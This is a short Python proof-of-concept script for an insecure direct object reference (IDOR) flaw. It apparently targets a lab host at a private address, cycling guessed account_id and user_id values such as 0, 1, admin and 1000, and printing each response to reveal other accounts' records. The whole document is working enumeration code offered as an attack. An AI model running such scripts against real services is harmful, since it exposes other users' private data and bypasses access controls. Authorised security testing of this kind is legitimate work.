#!/usr/bin/env python3
"""
Detailed IDOR PoC - Show actual response content from vulnerable endpoints
"""
import urllib.request
import json

target = "http://192.168.64.4"

print("[+] IDOR - Detailed Endpoint Analysis")
print(f"[*] Target: {target}")
print("=" * 80)

endpoints_to_test = [
    "http://192.168.64.4?account_id=0&user_id=0",
    "http://192.168.64.4?account_id=001&user_id=001",
    "http://192.168.64.4?account_id=1&user_id=1",
    "http://192.168.64.4?account_id=2&user_id=2",
    "http://192.168.64.4?account_id=3&user_id=3",
    "http://192.168.64.4?account_id=admin&user_id=admin",
    "http://192.168.64.4?account_id=user&user_id=user",
    "http://192.168.64.4?account_id=100&user_id=100",
    "http://192.168.64.4?account_id=1000&user_id=1000",
]

for i, url in enumerate(endpoints_to_test):
    print(f"\n[{i+1}] {url}")
    
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as response:
            content = response.read().decode('utf-8', errors='ignore')
            
            # Try to parse as JSON
            try:
                data = json.loads(content)
                print(f"    Status: {response.status}")
                print(f"    Type: JSON")
                # Show first 500 chars or truncated content
                preview = json.dumps(data, indent=2)[:800]
                print(f"    Content:\n{preview}")
            except json.JSONDecodeError:
                # Show truncated HTML/text
                print(f"    Status: {response.status}")
                print(f"    Type: Text/HTML ({len(content)} bytes)")
                preview = content[:800]
                print(f"    Content:\n{preview}")
    except Exception as e:
        print(f"    Error: {str(e)[:50]}")

print("\n" + "=" * 80)
print("[+] Endpoints analysis complete")
